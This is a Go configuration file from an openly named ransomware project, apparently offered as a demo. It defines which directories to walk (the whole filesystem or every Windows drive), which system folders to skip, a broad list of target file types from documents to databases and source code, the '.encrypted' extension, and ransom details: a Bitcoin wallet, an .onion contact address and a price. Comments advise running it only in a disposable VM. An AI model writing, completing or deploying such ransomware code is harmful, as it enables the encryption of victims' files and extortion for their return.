package cmd

import (
	"fmt"
	"log"
	"os"
	"runtime"
	"sync"

	"github.com/mauri870/ransomware/cryptofs"
	"github.com/mauri870/ransomware/utils"
)

var (
	UserDir = fmt.Sprintf("%s%c", utils.GetCurrentUser().HomeDir, os.PathSeparator)

	// Temp Dir
	TempDir = fmt.Sprintf("%s%c", os.TempDir(), os.PathSeparator)

	// Directories to walk searching for files
	// A single folder can be targeted on any platform with the
	// RANSOMWARE_DIR env var. Without it, on windows the malware walks
	// through all available drives, and on other platforms it walks the
	// entire filesystem (virtual/device dirs are excluded via SkippedDirs).
	// Only run the whole-filesystem mode inside a disposable VM!
	InterestingDirs = func() []string {
		if dir := os.Getenv("RANSOMWARE_DIR"); dir != "" {
			return []string{dir}
		}
		if runtime.GOOS == "windows" {
			return utils.GetDrives()
		}
		return []string{"/"}
	}()

	// Folders to skip
	SkippedDirs = func() []string {
		dirs := []string{
			"ProgramData",
			"Windows",
			"bootmgr",
			"$WINDOWS.~BT",
			"Windows.old",
			"Temp",
			"tmp",
			"Program Files",
			"Program Files (x86)",
			"AppData",
			"$Recycle.Bin",
		}
		if runtime.GOOS != "windows" {
			// On other platforms, skip virtual filesystems and device
			// nodes: encrypting /dev would destroy the VM disk, and
			// walking /proc or /sys can hang the process.
			dirs = append(dirs,
				"proc", "sys", "dev", "run", "boot", "snap", "lost+found",
				// VirtualBox shared folders are mounted as sf_<name>;
				// skipping them protects the host machine
				"sf_",
			)
		}
		return dirs
	}()

	// Interesting extensions to match files
	InterestingExtensions = []string{
		// Text Files
		"doc", "docx", "msg", "odt", "wpd", "wps", "txt",
		// Data files
		"csv", "pps", "ppt", "pptx",
		// Audio Files
		"aif", "iif", "m3u", "m4a", "mid", "mp3", "mpa", "wav", "wma",
		// Video Files
		"3gp", "3g2", "avi", "flv", "m4v", "mov", "mp4", "mpg", "vob", "wmv",
		// 3D Image files
		"3dm", "3ds", "max", "obj", "blend",
		// Raster Image Files
		"bmp", "gif", "png", "jpeg", "jpg", "psd", "tif", "gif", "ico",
		// Vector Image files
		"ai", "eps", "ps", "svg",
		// Page Layout Files
		"pdf", "indd", "pct", "epub",
		// Spreadsheet Files
		"xls", "xlr", "xlsx",
		// Database Files
		"accdb", "sqlite", "dbf", "mdb", "pdb", "sql", "db",
		// Game Files
		"dem", "gam", "nes", "rom", "sav",
		// Temp Files
		"bkp", "bak", "tmp",
		// Config files
		"cfg", "conf", "ini", "prf",
		// Source files
		"html", "php", "js", "c", "cc", "py", "lua", "go", "java",
	}

	// Max size allowed to match a file, 20MB by default
	MaxFileSize = int64(20 * 1e+6)

	// Indexer index files and control goroutines execution
	Indexer = struct {
		Files chan *cryptofs.File
		sync.WaitGroup
	}{
		Files: make(chan *cryptofs.File),
	}

	// The logger instance
	Logger = func() *log.Logger {
		// The default destination is os.Stderr, but you can set any io.Writer
		// as the log output. Use ioutil.Discard to ignore the log output
		//
		// Example with a file:
		// f, err := os.OpenFile(TempDir+"example.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0600)
		// handle error...
		// return log.New(f, "optional prefix", log.LstdFlags)
		//
		return log.New(os.Stderr, "", log.LstdFlags)
	}()

	// Workers processing the files
	NumWorkers = runtime.NumCPU()

	// Extension appended to files after encryption
	EncryptionExtension = ".encrypted"

	// Your wallet address
	Wallet = "FD0AhH61ona6fXS62RSQKhNF07Ijx5SBQO"

	// Your contact email
	ContactEmail = "example@ywtpdnpwihbyuvck.onion"

	// The ransom to pay
	Price = "0.345 BTC"
)

// CheckOS warn when the demo runs outside windows
func CheckOS() {
	if runtime.GOOS != "windows" {
		Logger.Println("Warning: this demo was originally designed for windows, but you are running on", runtime.GOOS)
	}
}
